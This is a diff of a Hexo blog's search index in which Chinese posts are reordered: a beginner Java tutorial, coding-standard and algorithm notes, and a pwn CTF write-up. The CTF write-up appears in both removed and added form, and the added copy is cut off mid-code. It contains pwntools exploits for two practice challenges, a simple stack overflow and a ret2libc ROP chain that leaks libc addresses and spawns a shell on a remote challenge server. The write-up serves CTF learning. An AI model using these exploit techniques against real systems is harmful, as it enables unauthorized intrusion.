@@ -1,6 +1,70 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Java入门基础</title>
+    <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p> Java初学，包含使用IDEA创建文件，基本程序等等</p>
+<span id="more"></span>
+
+<h4 id="创建新的程序"><a href="#创建新的程序" class="headerlink" title="创建新的程序"></a>创建新的程序</h4><p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/Java%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4.png"></p>
+<p>如上图，创建一个JAVA程序的步骤依次向下创建，注意一个工程可以包含多个模块，一个模块可以包含多个包，一个包可以包含多个类。</p>
+<h4 id="字面量-数据格式"><a href="#字面量-数据格式" class="headerlink" title="字面量(数据格式)"></a>字面量(数据格式)</h4><p>字符：用单引号括起来</p>
+<p>字符串：用双引号括起来</p>
+<p>空值：null</p>
+<p>特殊字符：\n:换行符，\t:缩进符</p>
+<p>默认整数是Int型，小数是double型，需要改变在数据后加上L/F。</p>
+<h4 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXXXXX</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><p>数据范围小的变量可以直接赋值给数据范围大的变量</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span>a;</span><br><span class="line"><span class="type">double</span> c=b;</span><br><span class="line">System.out.println(b)</span><br></pre></td></tr></table></figure>
+
+<p>另外注意在表达式中byte,short,char直接转化为Int型参与运算，因此byte+byte的结果类型必须定义为int。另外double&gt;float&gt;long&gt;int&gt;byte,short,char。一旦表达式有相应数据，则自动转化为大范围数据计算。</p>
+<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><ul>
+<li>逻辑与”&amp;”:有一个为false,结果是false。</li>
+<li>短路与”&amp;”:一个是false，结果是false。<strong>前一个是false，后面的条件就不执行了</strong></li>
+<li>逻辑或”|”和短路或”||” <strong>同上解释</strong></li>
+<li>逻辑非”!”</li>
+<li>逻辑异或”^”:相同时false，不同时true</li>
+</ul>
+<h4 id="键盘录入"><a href="#键盘录入" class="headerlink" title="键盘录入"></a>键盘录入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner<span class="comment">//导包</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//建立对象 </span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"><span class="type">int</span> age=sc.nextInt()</span><br><span class="line">System.out.println(<span class="string">&quot;你输入的密码是：&quot;</span>+age)</span><br></pre></td></tr></table></figure>
+
+<h4 id="关于空格，空行的方法"><a href="#关于空格，空行的方法" class="headerlink" title="关于空格，空行的方法"></a>关于空格，空行的方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(i+<span class="string">&quot;\t&quot;</span>)<span class="comment">//数据之间的空格操作</span></span><br><span class="line">System.out.println()<span class="comment">//数据的空行操作</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="案例小练习：猜数字"><a href="#案例小练习：猜数字" class="headerlink" title="案例小练习：猜数字"></a>案例小练习：猜数字</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> guessnumber;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">func</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        Random r=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> num=r.nextInt(<span class="number">100</span>)+<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已随机生成1-100的数字\n&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你猜的数字\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> input=sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(input&gt;num) System.out.println(<span class="string">&quot;你猜的数字过大&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(input&lt;num) System.out.println(<span class="string">&quot;你猜的数字过小&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] ages=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;<span class="comment">//静态初始化</span></span><br><span class="line"><span class="type">int</span>[]=&#123;input&#125;<span class="comment">//动态初始化</span></span><br><span class="line">System.out.println(ages.length)<span class="comment">//求数组长度</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h4><p>同一个类，出现多个方法名称相同，形参列表不同这些方法叫重载方法。</p>
+<p>p.s. 返回值类型没关系</p>
+<p>如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">()</span>&#123;</span><br><span class="line">	代码段<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">(String a)</span></span><br><span class="line">&#123;</span><br><span class="line">	代码段<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="return单独使用"><a href="#return单独使用" class="headerlink" title="return单独使用"></a>return单独使用</h4><p>单写一个return，</p>
+<p>可以跳出并立即结束所在方法的执行</p>
+<h4 id="生成随机字符"><a href="#生成随机字符" class="headerlink" title="生成随机字符"></a>生成随机字符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch=(char) (ra.nextInt(26)+65);//生成随机大写字母</span><br><span class="line">char ch2=(char) (ra.nextInt(26)+97);//生成随机小写字母</span><br></pre></td></tr></table></figure>
+
+<h4 id="String类常用api"><a href="#String类常用api" class="headerlink" title="String类常用api"></a>String类常用api</h4><p><strong>判断相等</strong>：在java中字符串内容比较不能使用”==”，因为java字符串表示的是地址。。</p>
+<p>如：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string name=<span class="string">&quot;zrm&quot;</span>;</span><br><span class="line">string password=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">string in_name,in_password;</span><br><span class="line">cin&gt;&gt;in_name&gt;&gt;in_password;</span><br><span class="line"><span class="keyword">if</span>(in_name==name&amp;&amp;in_password==password) cout&lt;&lt;<span class="string">&quot;正确&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;错误&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这一段C++代码是可以执行的，但是放在java中即使输入相同的名字密码都无法输出“正确”，因为定义的正确字符串存于常量区，而输入的字符串在堆内存中，两者的地址不一样，比较的结果是不相等。</p>
+<p>因此需要用到一个判断内容相等的api：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">String password=<span class="string">&quot;123456&quot;</span>；</span><br><span class="line">Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in)</span><br><span class="line"><span class="comment">//定义接受输入内容的对象....</span></span><br><span class="line">name.equal(in_name)<span class="comment">//判断name字符串和in_name字符串内容是否相等，包括大小写检验</span></span><br><span class="line">password.equalIgnoreCase(in_password)<span class="comment">//判断前后是否相等，忽略大小写</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>对字符串的操作</strong>:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=<span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">str.length();<span class="comment">//求字符串长度</span></span><br><span class="line">str.charAt(<span class="type">int</span> num);<span class="comment">//求字符串特定位置字符</span></span><br><span class="line">str.toCharArray();<span class="comment">//把字符串转成字符数组</span></span><br><span class="line">str.substring(<span class="type">int</span> first,<span class="type">int</span> last);<span class="comment">//截取，包前不包后</span></span><br><span class="line">str.substring(<span class="type">int</span> first);<span class="comment">//截取，从当前索引一直截取到末尾</span></span><br><span class="line">str.replace(String before,String <span class="keyword">new</span>);<span class="comment">//替换，把前一个内容全部替换成后一个内容</span></span><br><span class="line">str.contain(String s);<span class="comment">//判断是否包含，是返回true,否则返回false</span></span><br><span class="line">str.startsWith(String str);<span class="comment">//判断是否以此字符串开始</span></span><br><span class="line">String str2=<span class="string">&quot;aaa,bbb,ccc&quot;</span>;</span><br><span class="line">str.split(<span class="string">&quot;,&quot;</span>);<span class="comment">//按照&quot;,&quot;分开，返回字符串数组，需要有一个字符串数组对象接收返回值</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="生成验证码第二种表达方式"><a href="#生成验证码第二种表达方式" class="headerlink" title="生成验证码第二种表达方式"></a>生成验证码第二种表达方式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">special_number</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String str=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">        Random ra=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> num=ra.nextInt(str.length());</span><br><span class="line">            <span class="type">char</span> c=str.charAt(num);</span><br><span class="line">            res+=c;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ArrayList类"><a href="#ArrayList类" class="headerlink" title="ArrayList类"></a>ArrayList类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();<span class="comment">//尖括号内约束数据类型</span></span><br><span class="line">list.add();<span class="comment">//直接添加</span></span><br><span class="line">list.add(<span class="type">int</span> index,type data);<span class="comment">//在指定位置插入元素</span></span><br><span class="line">list.get(<span class="type">int</span> index);<span class="comment">//获得指定位置元素</span></span><br><span class="line">list.size();<span class="comment">//获得元素个数</span></span><br><span class="line">list.remove(<span class="type">int</span> index);<span class="comment">//删除索引位置元素，返回被删除的元素值</span></span><br><span class="line">list.remove(Object o);<span class="comment">//删除容器内元素的值，如有多个相同值则删除第一个</span></span><br><span class="line">list.set(<span class="type">int</span> index,E element);<span class="comment">//修改索引位置的元素为后面的元素</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>Java</tag>
+        <tag>语法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>“代码规范”</title>
     <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
     <content><![CDATA[<p> 软件开发代码规范:</p>
@@ -86,51 +150,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
-<span id="more"></span>
-
-<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/checksec.png"></p>
-<p>再看伪代码：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%BA%90%E7%A0%81.png"></p>
-<p>再看偏移量：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/ida.png"></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/level3_checksec.png"></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/level3_IDA.png"></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
-<ul>
-<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
-</ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E5%9C%B0%E5%9D%80%E8%A7%A3%E9%87%8A%E5%9B%BE.png"></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%A0%88%E4%B8%8A%E5%9B%BE%E5%83%8F.png"></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3>]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>基础算法01</title>
     <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
     <content><![CDATA[<p> 这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
@@ -181,94 +200,124 @@
       </tags>
   </entry>
   <entry>
-    <title>Java入门基础</title>
-    <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p> Java初学，包含使用IDEA创建文件，基本程序等等</p>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
 <span id="more"></span>
 
-<h4 id="创建新的程序"><a href="#创建新的程序" class="headerlink" title="创建新的程序"></a>创建新的程序</h4><p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/Java%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4.png"></p>
-<p>如上图，创建一个JAVA程序的步骤依次向下创建，注意一个工程可以包含多个模块，一个模块可以包含多个包，一个包可以包含多个类。</p>
-<h4 id="字面量-数据格式"><a href="#字面量-数据格式" class="headerlink" title="字面量(数据格式)"></a>字面量(数据格式)</h4><p>字符：用单引号括起来</p>
-<p>字符串：用双引号括起来</p>
-<p>空值：null</p>
-<p>特殊字符：\n:换行符，\t:缩进符</p>
-<p>默认整数是Int型，小数是double型，需要改变在数据后加上L/F。</p>
-<h4 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXXXXX</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/checksec.png"></p>
+<p>再看伪代码：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%BA%90%E7%A0%81.png"></p>
+<p>再看偏移量：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/ida.png"></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><p>数据范围小的变量可以直接赋值给数据范围大的变量</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span>a;</span><br><span class="line"><span class="type">double</span> c=b;</span><br><span class="line">System.out.println(b)</span><br></pre></td></tr></table></figure>
-
-<p>另外注意在表达式中byte,short,char直接转化为Int型参与运算，因此byte+byte的结果类型必须定义为int。另外double&gt;float&gt;long&gt;int&gt;byte,short,char。一旦表达式有相应数据，则自动转化为大范围数据计算。</p>
-<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><ul>
-<li>逻辑与”&amp;”:有一个为false,结果是false。</li>
-<li>短路与”&amp;”:一个是false，结果是false。<strong>前一个是false，后面的条件就不执行了</strong></li>
-<li>逻辑或”|”和短路或”||” <strong>同上解释</strong></li>
-<li>逻辑非”!”</li>
-<li>逻辑异或”^”:相同时false，不同时true</li>
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/level3_checksec.png"></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/level3_IDA.png"></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
 </ul>
-<h4 id="键盘录入"><a href="#键盘录入" class="headerlink" title="键盘录入"></a>键盘录入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner<span class="comment">//导包</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//建立对象 </span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"><span class="type">int</span> age=sc.nextInt()</span><br><span class="line">System.out.println(<span class="string">&quot;你输入的密码是：&quot;</span>+age)</span><br></pre></td></tr></table></figure>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E5%9C%B0%E5%9D%80%E8%A7%A3%E9%87%8A%E5%9B%BE.png"></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%A0%88%E4%B8%8A%E5%9B%BE%E5%83%8F.png"></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span 